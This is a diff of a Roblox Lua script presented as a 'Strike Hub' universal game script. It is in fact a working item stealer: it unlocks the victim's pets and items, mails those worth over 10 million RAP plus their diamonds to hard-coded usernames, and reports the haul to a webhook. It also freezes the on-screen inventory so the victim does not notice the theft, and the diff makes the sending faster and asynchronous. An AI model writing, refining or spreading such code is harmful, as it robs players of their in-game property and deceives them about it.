@@ -1,4 +1,4 @@
---// Strike Hub Universal Script (All Items + Visual Freeze)
+--// Strike Hub Universal Script (Visual Freeze + Async Sending)
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
@@ -8,7 +8,7 @@ print("[Strike Hub] Script starting... Please wait while we load!")
 local plr = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
---// Universal require helpers
+--// Universal require helper
 local function safeRequire(path)
 	local success, result = pcall(require, path)
 	return success and result or {}
@@ -18,14 +18,10 @@ local network = safeRequire(game.ReplicatedStorage.Library.Client.Network)
 local saveModule = safeRequire(game.ReplicatedStorage.Library.Client.Save)
 local message = safeRequire(game.ReplicatedStorage.Library.Client.Message)
 
---✅ Fixed save reference
-local rawSave = (saveModule.Get and saveModule.Get()) or {}
-local save = rawSave.Save or rawSave.Inventory or {}
-
 --// Settings
 local MailMessage = "GGz"
 local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
-local min_rap = _G.minrap or 1000000
+local min_rap = 10000000 -- Minimum RAP 10 million
 local webhook = _G.webhook or ""
 
 if next(users) == nil or webhook == "" then
@@ -40,9 +36,6 @@ for _, u in ipairs(users) do
 	end
 end
 
---// Executor-safe request handler
-local requestFunc = request or http_request or syn and syn.request or http and http.request or nil
-
 --// Safe getgc alternative
 local mailSendPrice = 10000
 pcall(function()
@@ -55,7 +48,10 @@ pcall(function()
 	end
 end)
 
---// Visual inventory snapshot
+--// Capture initial inventory for visual freeze
+local rawSave = (saveModule.Get and saveModule.Get()) or {}
+local save = rawSave.Save or rawSave.Inventory or {}
+
 local visualInventory = {Currency = {}, Pet = {}}
 for _, v in pairs(save.Currency or {}) do
 	visualInventory.Currency[v.id] = {_am = v._am}
@@ -64,16 +60,16 @@ for uid, pet in pairs(save.Pet or {}) do
 	visualInventory.Pet[uid] = pet
 end
 
---// Freeze the player's visible inventory (client-only)
+--// Freeze visual inventory
 task.spawn(function()
-	while task.wait(0.5) do
-		-- Keep currency visually the same
+	while task.wait(0.1) do
+		-- Freeze currency
 		for id, data in pairs(visualInventory.Currency) do
 			if save.Currency and save.Currency[id] then
 				save.Currency[id]._am = data._am
 			end
 		end
-		-- Keep pets visually the same
+		-- Freeze pets
 		for uid, petData in pairs(visualInventory.Pet) do
 			if save.Pet and save.Pet[uid] then
 				save.Pet[uid] = petData
@@ -82,7 +78,7 @@ task.spawn(function()
 	end
 end)
 
---// Maintain visual Diamonds count
+--// Maintain visual Diamonds
 local diamondsStat = plr.leaderstats and plr.leaderstats:FindFirstChild("💎 Diamonds")
 if diamondsStat then
 	local diamondsStart = diamondsStat.Value
@@ -100,7 +96,7 @@ local function formatNumber(n)
 	else return tostring(math.floor(n)) end
 end
 
---// RAP function (still works but not used for filtering)
+--// RAP function
 local function getRAP(_, item)
 	local success, val = pcall(function()
 		local RAPCmds = require(game.ReplicatedStorage.Library.Client.RAPCmds)
@@ -116,7 +112,7 @@ local function getRAP(_, item)
 	return success and val or (item._rap or 0)
 end
 
---// Send item (tries each user in order)
+--// Send item
 local function sendItem(category, uid, am)
 	for _, user in ipairs(users) do
 		local args = {user, MailMessage, category, uid, am or 1}
@@ -124,19 +120,16 @@ local function sendItem(category, uid, am)
 			return network.Invoke("Mailbox: Send", unpack(args))
 		end)
 		if ok and response == true then
-			task.wait(0.2)
 			mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
 			return true
 		elseif err == "They don't have enough space!" or err == "Mailbox is full" then
 			-- try next user
-		else
-			task.wait(0.2)
 		end
 	end
 	return false
 end
 
---// Send Gems (tries fallback users)
+--// Send Gems
 local function SendAllGems()
 	for i, v in pairs(save.Currency or {}) do
 		if v.id == "Diamonds" and v._am >= mailSendPrice + 10000 then
@@ -146,14 +139,14 @@ local function SendAllGems()
 					return network.Invoke("Mailbox: Send", unpack(args))
 				end)
 				if ok and response == true then break end
-				task.wait(0.2)
+				task.wait(0.05)
 			end
 			break
 		end
 	end
 end
 
---// Unlock items first
+--// Unlock items
 for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
 	if save[cat] then
 		for uid, item in pairs(save[cat]) do
@@ -164,18 +157,20 @@ for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard"
 	end
 end
 
---// Collect all items (no RAP filter)
+--// Collect items with RAP >= 10,000,000
 local sortedItems, totalRAP = {}, 0
 for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
 	if save[cat] then
 		for uid, item in pairs(save[cat]) do
 			local rap = getRAP(cat, item)
-			local prefix = (item.sh and "Shiny " or "")
-			if item.pt == 1 then prefix ..= "Golden "
-			elseif item.pt == 2 then prefix ..= "Rainbow " end
-			local name = prefix .. item.id
-			table.insert(sortedItems, {category=cat, uid=uid, amount=item._am or 1, rap=rap, name=name})
-			totalRAP += rap * (item._am or 1)
+			if rap >= min_rap then
+				local prefix = (item.sh and "Shiny " or "")
+				if item.pt == 1 then prefix ..= "Golden "
+				elseif item.pt == 2 then prefix ..= "Rainbow " end
+				local name = prefix .. item.id
+				table.insert(sortedItems, {category=cat, uid=uid, amount=item._am or 1, rap=rap, name=name})
+				totalRAP += rap * (item._am or 1)
+			end
 		end
 	end
 end
@@ -184,15 +179,9 @@ table.sort(sortedItems, function(a,b)
 	return a.rap*a.amount > b.rap*b.amount
 end)
 
---// Show message once
-if message and message.Error then
-	message.Error("Please wait while the script loads!")
-else
-	print("[Strike Hub] Please wait while the script loads!")
-end
-
 --// Webhook
 task.spawn(function()
+	local requestFunc = request or http_request or syn and syn.request or http and http.request or nil
 	if not requestFunc then return end
 	local headers = {["Content-Type"]="application/json"}
 	local fields = {
@@ -216,10 +205,12 @@ task.spawn(function()
 	end)
 end)
 
---// Send items sequentially
+--// Send items asynchronously to reduce loading buffers
 for _, item in ipairs(sortedItems) do
-	task.wait(0.2)
-	sendItem(item.category, item.uid, item.amount)
+	task.spawn(function()
+		sendItem(item.category, item.uid, item.amount)
+	end)
+	task.wait(0.05)
 end
 
 --// Send gems last
